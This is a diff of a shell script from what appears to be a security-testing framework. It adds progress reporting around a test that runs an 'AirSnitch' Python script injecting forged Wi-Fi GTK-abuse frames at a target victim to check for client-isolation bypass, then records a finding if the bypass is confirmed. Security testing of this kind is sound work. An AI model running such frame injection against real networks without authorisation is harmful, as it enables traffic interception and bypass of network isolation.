@@ -106,9 +106,15 @@ sendp(p_gtk, iface=iface, count=3, verbose=0)
 print("[*] GTK-Abuse frames injected. Monitor victim for unsolicited responses.")
 EOF
 
-python3 "$AIRSNITCH_PY" "$TARGET_VICTIM" "$GATEWAY_MAC" "$INTERFACE" > "$AIRSNITCH_LOG" 2>&1 || true
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 20 --status "Executing AirSnitch bypass tests..."
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    python3 "$AIRSNITCH_PY" "$TARGET_VICTIM" "$GATEWAY_MAC" "$INTERFACE" | tee "$AIRSNITCH_LOG" || true
+else
+    python3 "$AIRSNITCH_PY" "$TARGET_VICTIM" "$GATEWAY_MAC" "$INTERFACE" > "$AIRSNITCH_LOG" 2>&1 || true
+fi
 
 # 2. Reporting
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 90 --status "Analyzing bypass results..."
 if grep -q "VULNERABILITY CONFIRMED" "$AIRSNITCH_LOG"; then
     echo "[!] SUCCESS: AIRSNITCH ISOLATION BYPASS CONFIRMED!"
     "$ASTRA_BIN" record-finding \
